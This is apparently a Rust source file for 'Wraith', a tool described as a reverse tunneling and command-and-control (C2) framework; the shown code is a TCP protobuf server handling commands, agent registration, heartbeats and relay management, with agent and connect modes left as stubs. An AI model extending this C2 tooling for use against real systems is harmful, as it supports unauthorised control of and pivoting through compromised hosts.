use anyhow::Result;
use bytes::BytesMut;
use clap::{Parser, Subcommand};
use log::{error, info, LevelFilter};
use prost::Message;
use simplelog::{Config, WriteLogger};
use std::sync::Arc;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::{TcpListener, TcpStream};
use tokio::sync::Mutex;

mod commands;
mod proto;
mod relay;

use commands::CommandHandler;
use proto::wraith::{wraith_message::Payload, WraithMessage};
use relay::RelayManager;

#[derive(Parser)]
#[command(name = "wraith")]
#[command(about = "Wraith reverse tunneling tool", long_about = None)]
struct Cli {
    #[command(subcommand)]
    command: Commands,
}

#[derive(Subcommand)]
enum Commands {
    /// Listen for C2 connection
    CommandListen {
        #[arg(value_name = "ADDRESS")]
        address: String,
    },
    /// Connect to C2
    CommandConnect {
        #[arg(value_name = "ADDRESS")]
        address: String,
    },
    /// Listen for wraith connection (Stage 2)
    AgentListen {
        #[arg(value_name = "ADDRESS")]
        address: String,
    },
    /// Connect to wraith (Stage 2)
    AgentConnect {
        #[arg(value_name = "ADDRESS")]
        address: String,
    },
}

struct WraithServer {
    relay_manager: Arc<Mutex<RelayManager>>,
    command_handler: CommandHandler,
}

impl WraithServer {
    fn new(relay_manager: Arc<Mutex<RelayManager>>) -> Self {
        Self {
            relay_manager: Arc::clone(&relay_manager),
            command_handler: CommandHandler::new(Arc::clone(&relay_manager)),
        }
    }

    async fn handle_message(&self, msg: WraithMessage) -> Result<WraithMessage> {
        info!("Handling message type: {:?}", msg.msg_type);

        match &msg.payload {
            Some(Payload::Command(cmd)) => {
                let result = self.command_handler.handle_command(cmd.clone()).await?;
                Ok(WraithMessage {
                    msg_type: proto::wraith::MessageType::CommandResult as i32,
                    message_id: msg.message_id,
                    timestamp: std::time::SystemTime::now()
                        .duration_since(std::time::UNIX_EPOCH)
                        .unwrap()
                        .as_secs() as i64,
                    payload: Some(Payload::Result(result)),
                })
            }
            Some(Payload::Registration(reg)) => {
                info!("Registration from {}@{} ({})",
                    reg.username, reg.hostname, reg.ip_address);
                Ok(WraithMessage {
                    msg_type: proto::wraith::MessageType::Registration as i32,
                    message_id: msg.message_id,
                    timestamp: std::time::SystemTime::now()
                        .duration_since(std::time::UNIX_EPOCH)
                        .unwrap()
                        .as_secs() as i64,
                    payload: None,
                })
            }
            Some(Payload::Heartbeat(hb)) => {
                info!("Heartbeat: {} (last command: {})",
                    hb.status, hb.last_command_time);
                Ok(WraithMessage {
                    msg_type: proto::wraith::MessageType::Heartbeat as i32,
                    message_id: msg.message_id,
                    timestamp: std::time::SystemTime::now()
                        .duration_since(std::time::UNIX_EPOCH)
                        .unwrap()
                        .as_secs() as i64,
                    payload: None,
                })
            }
            Some(Payload::RelayCreate(rc)) => {
                info!("Relay create: {} -> {}:{}", rc.relay_id, rc.listen_host, rc.listen_port);
                Ok(WraithMessage {
                    msg_type: proto::wraith::MessageType::RelayCreate as i32,
                    message_id: msg.message_id,
                    timestamp: std::time::SystemTime::now()
                        .duration_since(std::time::UNIX_EPOCH)
                        .unwrap()
                        .as_secs() as i64,
                    payload: Some(Payload::RelayCreate(rc.clone())),
                })
            }
            Some(Payload::RelayDelete(rd)) => {
                info!("Relay delete: {}", rd.relay_id);
                Ok(WraithMessage {
                    msg_type: proto::wraith::MessageType::RelayDelete as i32,
                    message_id: msg.message_id,
                    timestamp: std::time::SystemTime::now()
                        .duration_since(std::time::UNIX_EPOCH)
                        .unwrap()
                        .as_secs() as i64,
                    payload: Some(Payload::RelayDelete(rd.clone())),
                })
            }
            Some(Payload::RelayList(_rl)) => {
                info!("Relay list request");
                let relays = {
                    let manager = self.relay_manager.lock().await;
                    manager.list_relays()
                };
                let proto_relays: Vec<proto::wraith::RelayInfo> = relays
                    .into_iter()
                    .map(|r| proto::wraith::RelayInfo {
                        relay_id: r.relay_id,
                        listen_host: r.listen_host,
                        listen_port: r.listen_port as i32,
                        forward_host: r.forward_host,
                        forward_port: r.forward_port as i32,
                        active: r.active,
                    })
                    .collect();
                Ok(WraithMessage {
                    msg_type: proto::wraith::MessageType::RelayListResponse as i32,
                    message_id: msg.message_id,
                    timestamp: std::time::SystemTime::now()
                        .duration_since(std::time::UNIX_EPOCH)
                        .unwrap()
                        .as_secs() as i64,
                    payload: Some(Payload::RelayListResponse(proto::wraith::RelayListResponse {
                        relays: proto_relays,
                    })),
                })
            }
            Some(Payload::Result(_)) | Some(Payload::RelayListResponse(_)) => {
                // These are responses we don't need to handle in the server
                Ok(msg)
            }
            None => {
                Err(anyhow::anyhow!("Empty message payload"))
            }
        }
    }

    async fn handle_connection(&self, mut socket: TcpStream) -> Result<()> {
        info!("New connection from: {:?}", socket.peer_addr());

        loop {
            // Read 4-byte length prefix
            let mut len_buf = [0u8; 4];
            match socket.read_exact(&mut len_buf).await {
                Ok(_) => {}
                Err(e) => {
                    if e.kind() == std::io::ErrorKind::UnexpectedEof {
                        info!("Connection closed");
                    } else {
                        error!("Failed to read length: {}", e);
                    }
                    return Ok(());
                }
            }

            let len = u32::from_be_bytes(len_buf) as usize;
            if len > 10 * 1024 * 1024 {
                error!("Message too large: {} bytes", len);
                return Ok(());
            }

            // Read message bytes
            let mut msg_buf = BytesMut::with_capacity(len);
            msg_buf.resize(len, 0);
            if let Err(e) = socket.read_exact(&mut msg_buf).await {
                error!("Failed to read message: {}", e);
                return Ok(());
            }

            // Decode message
            let msg = match WraithMessage::decode(&msg_buf[..]) {
                Ok(m) => m,
                Err(e) => {
                    error!("Failed to decode message: {}", e);
                    continue;
                }
            };

            // Handle message and get response
            match self.handle_message(msg).await {
                Ok(response) => {
                    // Encode response
                    let mut response_buf = BytesMut::new();
                    if let Err(e) = response.encode(&mut response_buf) {
                        error!("Failed to encode response: {}", e);
                        continue;
                    }

                    // Write length prefix + message
                    let response_len = response_buf.len() as u32;
                    let mut send_buf = BytesMut::with_capacity(4 + response_buf.len());
                    send_buf.extend_from_slice(&response_len.to_be_bytes());
                    send_buf.extend_from_slice(&response_buf);

                    if let Err(e) = socket.write_all(&send_buf).await {
                        error!("Failed to send response: {}", e);
                        return Ok(());
                    }
                }
                Err(e) => {
                    error!("Error handling message: {}", e);
                }
            }
        }
    }
}

async fn run_server(addr: &str, relay_manager: Arc<Mutex<RelayManager>>) -> Result<()> {
    let server = WraithServer::new(Arc::clone(&relay_manager));

    let listener = TcpListener::bind(addr).await?;
    info!("Server listening on {}", addr);

    loop {
        match listener.accept().await {
            Ok((socket, addr)) => {
                info!("Accepted connection from: {:?}", addr);
                let server = WraithServer::new(Arc::clone(&relay_manager));
                tokio::spawn(async move {
                    if let Err(e) = server.handle_connection(socket).await {
                        error!("Connection error: {}", e);
                    }
                });
            }
            Err(e) => {
                error!("Failed to accept connection: {}", e);
            }
        }
    }
}

#[tokio::main]
async fn main() -> Result<()> {
    // Initialize logging
    WriteLogger::init(
        LevelFilter::Info,
        Config::default(),
        std::fs::OpenOptions::new()
            .create(true)
            .append(true)
            .open("wraith.log")?,
    )?;

    let cli = Cli::parse();

    match cli.command {
        Commands::CommandListen { address } => {
            info!("Starting C2 listener on {}", address);
            let relay_manager = Arc::new(Mutex::new(RelayManager::new()));
            run_server(&address, relay_manager).await
        }
        Commands::CommandConnect { address } => {
            info!("Connecting to C2 at {}", address);
            unreachable!("C2 connect not implemented")
        }
        Commands::AgentListen { address } => {
            info!("Starting agent listener on {}", address);
            unreachable!("Agent listen not implemented (Stage 2)")
        }
        Commands::AgentConnect { address } => {
            info!("Connecting to agent at {}", address);
            unreachable!("Agent connect not implemented (Stage 2)")
        }
    }
}
